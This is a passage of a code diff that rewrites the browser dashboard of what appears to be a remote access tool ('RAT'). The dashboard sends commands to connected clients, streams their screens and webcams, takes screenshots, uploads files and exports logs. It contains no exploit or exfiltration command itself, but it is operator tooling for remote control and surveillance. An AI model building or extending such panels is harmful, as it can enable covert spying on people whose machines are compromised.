-      return response;
+    // --- SERVER STATS ---
+    async function loadServerStats() {
+        DOM.serverStatsLoading.style.display = 'flex';
+        const response = await fetchWithAuth('/stats');
+        DOM.serverStatsLoading.style.display = 'none';
+        if (response && response.ok) {
+            const stats = await response.json();
+            displayServerStats(stats);
+            DOM.serverStatsModal.classList.remove('hidden');
+        } else {
+            showNotification('Failed to load server statistics.', 'error');
+        }
     }
-    async function loadServerStats() { /* ... */ }
-    function displayServerStats(stats) { /* ... */ }
-    function displayScreenshot(base64Data) { /* ... */ }
-    function displayScreenFrame(base64Data) { /* ... */ }
-    function displayWebcamFrame(data) { /* ... */ }
-    function downloadFile(filename, base64Data) { /* ... */ }
-    function setupFileUpload() { /* ... */ }
-    function handleFileUpload(event) { /* ... */ }
 
-    // Event Listeners
-    function setupEventListeners() {
-      sendCommandBtn.addEventListener('click', sendCommandToClients);
-      document.querySelectorAll('.quick-action').forEach(btn => {
-        btn.addEventListener('click', () => {
-          commandInput.value = btn.dataset.command + ' ';
-          commandInput.focus();
+    function displayServerStats(stats) {
+        const content = DOM.serverStatsContent;
+        content.innerHTML = ''; // Clear previous stats
+        const statItems = {
+            'Uptime': stats.uptime,
+            'Total Clients': stats.total_clients,
+            'CPU Usage': `${stats.cpu_usage}%`,
+            'Memory Usage': `${stats.memory_usage.percent}% (${stats.memory_usage.used_mb}MB / ${stats.memory_usage.total_mb}MB)`,
+            'Python Version': stats.python_version,
+            'Server OS': stats.server_os,
+            'Sent Messages': stats.messages.sent,
+            'Received Messages': stats.messages.received
+        };
+
+        Object.entries(statItems).forEach(([title, value]) => {
+            const card = document.createElement('div');
+            card.className = 'glass-effect p-4 rounded-lg stat-card-wrapper';
+            card.innerHTML = `
+                <div class="text-gray-400 stat-card-title">${title}</div>
+                <div class="text-white font-bold stat-card-value" title="${value}">${value}</div>
+            `;
+            content.appendChild(card);
         });
-      });
-      document.getElementById('refresh-clients').addEventListener('click', requestClientList);
-      document.getElementById('select-all-clients').addEventListener('click', () => {
-        const allClientIds = Array.from(document.querySelectorAll('.client-card')).map(card => card.dataset.clientId);
-        selectedClients.clear();
-        allClientIds.forEach(id => selectedClients.add(id));
-        updateSelectedCount();
-        updateClientVisuals();
-      });
-      // ... weitere Event Listeners
-      setupCommandInput();
-      setupFileUpload();
     }
 
-    // Initialize Application
+    // --- EVENT LISTENERS ---
+    function setupEventListeners() {
+        // Command sending
+        $('#send-command').addEventListener('click', sendCommandToClients);
+        DOM.commandInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' && !e.shiftKey) {
+                e.preventDefault();
+                sendCommandToClients();
+            }
+        });
+        DOM.commandInput.addEventListener('input', showCommandSuggestions);
+        document.addEventListener('click', (e) => {
+            if (!DOM.commandInput.contains(e.target)) hideCommandSuggestions();
+        });
+
+        // Quick actions
+        $('.quick-action').forEach(btn => {
+            btn.addEventListener('click', () => {
+                DOM.commandInput.value = btn.dataset.command + ' ';
+                DOM.commandInput.focus();
+                showCommandSuggestions();
+            });
+        });
+
+        // Client management
+        $('#refresh-clients').addEventListener('click', requestClientList);
+        $('#select-all-clients').addEventListener('click', () => {
+            const allClientIds = Array.from($('.client-card')).map(card => card.dataset.clientId);
+            const allSelected = selectedClients.size === allClientIds.length;
+            selectedClients.clear();
+            if (!allSelected) allClientIds.forEach(id => selectedClients.add(id));
+            updateSelectedCount();
+            updateClientVisuals();
+        });
+
+        // Output management
+        $('#clear-output').addEventListener('click', () => {
+            DOM.outputArea.innerHTML = `<div class="text-gray-400 text-center py-5"><i class="fas fa-terminal text-3xl mb-3"></i><p>Output cleared.</p></div>`;
+        });
+        $('#copy-output').addEventListener('click', () => {
+            const textToCopy = Array.from(DOM.outputArea.children).map(el => el.innerText).reverse().join('\n');
+            navigator.clipboard.writeText(textToCopy).then(() => showNotification('Output copied to clipboard.', 'success'), () => showNotification('Failed to copy output.', 'error'));
+        });
+        $('#export-logs').addEventListener('click', () => {
+            const textToExport = Array.from(DOM.outputArea.children).map(el => el.innerText).reverse().join('\n');
+            const blob = new Blob([textToExport], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `rat_logs_${new Date().toISOString()}.txt`;
+            a.click();
+            URL.revokeObjectURL(url);
+        });
+
+        // File upload
+        $('#upload-btn').addEventListener('click', () => DOM.fileUpload.click());
+        DOM.fileUpload.addEventListener('change', (e) => {
+            if (e.target.files.length > 0) {
+                Array.from(e.target.files).forEach(uploadFile);
+            }
+        });
+
+        // Media controls
+        $('#download-screenshot').addEventListener('click', () => {
+            const a = document.createElement('a');
+            a.href = DOM.screenshotImg.src;
+            a.download = `screenshot_${new Date().toISOString()}.png`;
+            a.click();
+        });
+        $('#stop-screen-stream').addEventListener('click', () => {
+            DOM.commandInput.value = '/screenstream_stop';
+            sendCommandToClients();
+            DOM.screenStreamContainer.classList.add('hidden');
+            DOM.mediaPlaceholder.classList.remove('hidden');
+        });
+        $('#stop-webcam').addEventListener('click', () => {
+            DOM.commandInput.value = '/webcam_stop';
+            sendCommandToClients();
+            DOM.webcamContainer.classList.add('hidden');
+            DOM.mediaPlaceholder.classList.remove('hidden');
+        });
+
+        // Server stats modal
+        $('#server-stats-btn').addEventListener('click', loadServerStats);
+        $('#close-stats-modal').addEventListener('click', () => DOM.serverStatsModal.classList.add('hidden'));
+        $('#refresh-stats').addEventListener('click', loadServerStats);
+    }
+
+    // --- INITIALIZATION ---
     function init() {
-      setupEventListeners();
-      const token = localStorage.getItem('rat_token');
-      if (token) {
-        mainApp.classList.remove('hidden');
-        connectWebSocket();
-      } else {
-        const errorMessage = encodeURIComponent('Bitte melden Sie sich an.');
-        window.location.href = `/login?error=${errorMessage}`;
-      }
+        if (localStorage.getItem('rat_token')) {
+            DOM.mainApp.classList.remove('hidden');
+            setupEventListeners();
+            connectWebSocket();
+        } else {
+            window.location.href = `/login?error=${encodeURIComponent('Please log in.')}`;
+        }
     }
 
-    init();
+    document.addEventListener('DOMContentLoaded', init);
   </script>
 </body>
 </html>
